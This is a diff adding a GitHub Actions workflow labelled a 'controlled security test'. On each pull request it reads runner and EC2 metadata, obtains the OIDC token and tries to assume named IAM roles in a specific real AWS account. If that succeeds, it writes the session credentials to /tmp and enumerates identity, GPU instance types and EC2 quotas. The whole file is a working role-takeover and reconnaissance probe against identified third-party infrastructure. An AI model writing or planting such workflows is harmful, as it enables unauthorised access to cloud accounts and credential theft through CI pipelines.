@@ -1,0 +1,169 @@
+name: c211-oidc-probe
+# Controlled security test (intent 123619). Read-only. Never prints the raw OIDC JWT
+# or any STS session credential material; only decoded public claims and STS result codes.
+on:
+  pull_request:
+    branches:
+      - main
+    types: [opened, synchronize, reopened]
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  oidc:
+    name: oidc-exact-subject-probe
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - name: Claims, STS attempts, bounded read-only capacity summary
+        env:
+          ROLE_A: arn:aws:iam::159553542841:role/awslabs-AOSH-GitHubActionsRole
+          ROLE_B: arn:aws:iam::159553542841:role/adai-template-publisher
+          ROLE_CTRL: arn:aws:iam::159553542841:role/c211-i123619-nonexistent-control
+        run: |
+          set -uo pipefail
+          NONCE="c211-i123619-e5b36c2d58cc129d"
+          echo "C211_NONCE_START=${NONCE}"
+          echo "runner_host=$(hostname) whoami=$(whoami) uid=$(id -u) kernel=$(uname -r)"
+          echo "event=${GITHUB_EVENT_NAME} repository=${GITHUB_REPOSITORY} ref=${GITHUB_REF} head_ref=${GITHUB_HEAD_REF:-} base_ref=${GITHUB_BASE_REF:-} sha=${GITHUB_SHA} actor=${GITHUB_ACTOR}"
+          echo "workflow_ref_env=${GITHUB_WORKFLOW_REF:-unset} job=${GITHUB_JOB} run_id=${GITHUB_RUN_ID} run_attempt=${GITHUB_RUN_ATTEMPT:-}"
+          echo "runner_name=${RUNNER_NAME:-} runner_group=${RUNNER_GROUP:-}"
+
+          # ---------- Bounded runner metadata (IMDSv2, read-only) ----------
+          IMDS_TOKEN=$(curl -sS -m 5 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 60' http://169.254.169.254/latest/api/token 2>/dev/null || true)
+          if [ -n "${IMDS_TOKEN:-}" ]; then
+            for k in instance-id instance-type placement/availability-zone; do
+              v=$(curl -sS -m 5 -H "X-aws-ec2-metadata-token: $IMDS_TOKEN" "http://169.254.169.254/latest/meta-data/$k" 2>/dev/null || true)
+              echo "imds_$(echo $k | tr '/' '_')=$v"
+            done
+          else
+            echo "imds_token=unavailable (not on an EC2 runner or IMDS blocked)"
+          fi
+
+          # ---------- 1) Request the GitHub OIDC token ----------
+          if [ -z "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] || [ -z "${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}" ]; then
+            echo "OIDC_UNAVAILABLE: ACTIONS_ID_TOKEN_REQUEST_URL/TOKEN are not set for this event context"
+            echo "C211_NONCE_END=${NONCE}"
+            exit 0
+          fi
+          RESP=$(curl -sS -m 20 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com")
+          IDTOKEN=$(printf '%s' "$RESP" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))' 2>/dev/null || true)
+          if [ -z "${IDTOKEN:-}" ]; then
+            echo "OIDC_REQUEST_FAILED_HEAD=$(printf '%s' "$RESP" | head -c 300)"
+            echo "C211_NONCE_END=${NONCE}"
+            exit 0
+          fi
+          echo "IDTOKEN_LEN=${#IDTOKEN}"
+          echo "IDTOKEN_SHA256=$(printf '%s' "$IDTOKEN" | sha256sum | cut -d' ' -f1)"
+          python3 - "$IDTOKEN" <<'PY'
+          import sys, json, base64
+          t = sys.argv[1].split('.')
+          p = t[1] + '=' * (-len(t[1]) % 4)
+          c = json.loads(base64.urlsafe_b64decode(p))
+          keys = ["iss","sub","aud","repository","repository_owner","repository_id","repository_visibility",
+                  "ref","ref_type","event_name","workflow_ref","job_workflow_ref","environment","actor","run_id","sha"]
+          print("C211_CLAIMS=" + json.dumps({k: c.get(k) for k in keys}))
+          PY
+
+          # ---------- 2) STS AssumeRoleWithWebIdentity attempts (unsigned API) ----------
+          sts_attempt() {
+            label="$1"; role="$2"; mode="$3"
+            if [ "$mode" = "real" ]; then T="$IDTOKEN"; else T="eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJib2d1cyJ9.bogus"; fi
+            xml=$(curl -sS -m 25 -X POST https://sts.amazonaws.com/ \
+              --data-urlencode "Action=AssumeRoleWithWebIdentity" \
+              --data-urlencode "Version=2011-06-15" \
+              --data-urlencode "RoleArn=$role" \
+              --data-urlencode "RoleSessionName=${NONCE}-${label}" \
+              --data-urlencode "WebIdentityToken=$T" \
+              --data-urlencode "DurationSeconds=900" 2>/dev/null || true)
+            RESP_XML="$xml" python3 - "$label" "$role" "$mode" <<'PY'
+          import os, sys, json, xml.etree.ElementTree as ET
+          label, role, mode = sys.argv[1], sys.argv[2], sys.argv[3]
+          raw = os.environ.get('RESP_XML', '')
+          out = {"label": label, "role": role, "mode": mode, "xml_len": len(raw)}
+          try:
+              root = ET.fromstring(raw)
+          except Exception:
+              out["parse"] = "fail"
+              out["raw_head"] = raw[:200]
+              print("C211_STS=" + json.dumps(out))
+              raise SystemExit
+          def txt(tag):
+              e = root.find('.//{https://sts.amazonaws.com/doc/2011-06-15/}' + tag)
+              if e is None:
+                  e = root.find('.//' + tag)
+              return e.text if e is not None else None
+          out["Code"] = txt('Code')
+          out["Message"] = txt('Message')
+          out["AssumedRoleUser_Arn"] = txt('Arn')
+          out["Expiration"] = txt('Expiration')
+          cred = root.find('.//{https://sts.amazonaws.com/doc/2011-06-15/}Credentials')
+          if cred is None:
+              cred = root.find('.//Credentials')
+          if cred is not None:
+              ak = cred.find('{https://sts.amazonaws.com/doc/2011-06-15/}AccessKeyId')
+              if ak is None:
+                  ak = cred.find('AccessKeyId')
+              sk = cred.find('{https://sts.amazonaws.com/doc/2011-06-15/}SecretAccessKey')
+              if sk is None:
+                  sk = cred.find('SecretAccessKey')
+              tk = cred.find('{https://sts.amazonaws.com/doc/2011-06-15/}SessionToken')
+              if tk is None:
+                  tk = cred.find('SessionToken')
+              if ak is not None and sk is not None:
+                  out["assumed"] = True
+                  envdir = os.environ.get('C211_ENVDIR', '/tmp')
+                  path = os.path.join(envdir, 'c211_creds_' + label + '.env')
+                  with open(path, 'w') as f:
+                      f.write("AWS_ACCESS_KEY_ID=" + (ak.text or '') + "\n")
+                      f.write("AWS_SECRET_ACCESS_KEY=" + (sk.text or '') + "\n")
+                      f.write("AWS_SESSION_TOKEN=" + ((tk.text if tk is not None else '') or '') + "\n")
+                  os.chmod(path, 0o600)
+                  out["creds_file"] = path
+          out.setdefault("assumed", False)
+          print("C211_STS=" + json.dumps(out))
+          PY
+          }
+
+          export C211_ENVDIR=/tmp
+          sts_attempt A "$ROLE_A" real
+          sts_attempt B "$ROLE_B" real
+          sts_attempt CTRL "$ROLE_CTRL" real
+          sts_attempt BADTOKEN "$ROLE_A" bogus
+
+          # ---------- 3) If any role was actually assumed: nonce-tagged identity + bounded read-only GPU capacity ----------
+          for f in /tmp/c211_creds_*.env; do
+            [ -s "$f" ] || continue
+            label=$(basename "$f" .env | sed 's/^c211_creds_//')
+            echo "C211_ASSUMED label=${label}"
+            set -a; . "$f"; set +a
+            export AWS_DEFAULT_REGION=us-east-1
+            command -v aws >/dev/null 2>&1 || python3 -m pip install -q --disable-pip-version-check awscli >/dev/null 2>&1 || true
+            if command -v aws >/dev/null 2>&1; then
+              echo "C211_IDENTITY_START ${label} nonce=${NONCE}"
+              aws sts get-caller-identity --output json 2>&1 | head -c 1200
+              echo
+              echo "C211_IDENTITY_END ${label}"
+              echo "C211_CAPACITY_START ${label} (bounded, read-only)"
+              timeout 40 aws ec2 describe-instance-types \
+                --filters "Name=gpu-info.gpus.manufacturer,Values=NVIDIA" \
+                --query "InstanceTypes[].{t:InstanceType,n:GpuInfo.Gpus[0].Name,c:GpuInfo.Gpus[0].Count,mem:GpuInfo.Gpus[0].MemoryInfo.SizeInMiB}" \
+                --output json 2>&1 | head -c 2500
+              echo
+              timeout 30 aws ec2 describe-instance-type-offerings --location-type availability-zone \
+                --filters "Name=instance-type,Values=p5.48xlarge,p5e.48xlarge,p4d.24xlarge,p4de.24xlarge,p3dn.24xlarge,g6e.12xlarge,g6e.48xlarge,g6.12xlarge,g5.48xlarge,g5.12xlarge" \
+                --query "InstanceTypeOfferings[].{t:InstanceType,az:Location}" --output json 2>&1 | head -c 2000
+              echo
+              timeout 30 aws service-quotas list-service-quotas --service-code ec2 \
+                --query "Quotas[?contains(QuotaName,'On-Demand') && (contains(QuotaName,'P4') || contains(QuotaName,'P5') || contains(QuotaName,'G5') || contains(QuotaName,'G6') || contains(QuotaName,'All P') || contains(QuotaName,'All G'))].{n:QuotaName,v:Value}" \
+                --output json 2>&1 | head -c 2000
+              echo
+              echo "C211_CAPACITY_END ${label}"
+            else
+              echo "C211_AWS_CLI_UNAVAILABLE ${label}"
+            fi
+            unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
+          done
+          echo "C211_NONCE_END=${NONCE}"
